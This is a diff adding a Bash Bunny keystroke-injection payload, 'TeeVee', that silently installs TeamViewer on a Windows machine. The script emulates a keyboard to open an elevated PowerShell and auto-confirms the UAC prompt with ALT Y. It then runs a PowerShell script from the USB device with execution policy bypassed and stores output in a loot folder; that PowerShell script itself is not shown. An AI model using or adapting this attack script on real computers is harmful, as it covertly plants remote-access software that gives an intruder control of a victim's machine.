@@ -1,0 +1,40 @@
+############################################################################################
+# Name: TeeVee
+# Purpose: Silently install and configure TeamViewer - free version
+# Version: 1.0
+# Author: Mike Galvin
+# Contact: mike@gal.vin or twitter.com/mikegalvin_
+# Date: 2020-01-20
+#############################################################################################
+
+#!/bin/bash
+
+# Options
+LOOTDIR=/root/udisk/loot/TeeVee
+
+######## INITIALIZATION ########
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE
+
+######## MAKE LOOT DIRECTORY ########
+mkdir -p $LOOTDIR
+
+######## ATTACK ########
+ATTACKMODE HID STORAGE
+LED ATTACK
+RUN WIN "powershell -Command "Start-Process powershell -Verb RunAs""
+sleep 6
+Q ALT Y
+sleep 5
+Q STRING "\$pl = (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\t.ps1'"
+Q ENTER
+sleep 3
+Q STRING "powershell -ep bypass \$pl"
+Q ENTER
+sleep 5
+Q STRING "exit"
+Q ENTER
+
+######## FINISH ########
+LED FINISH
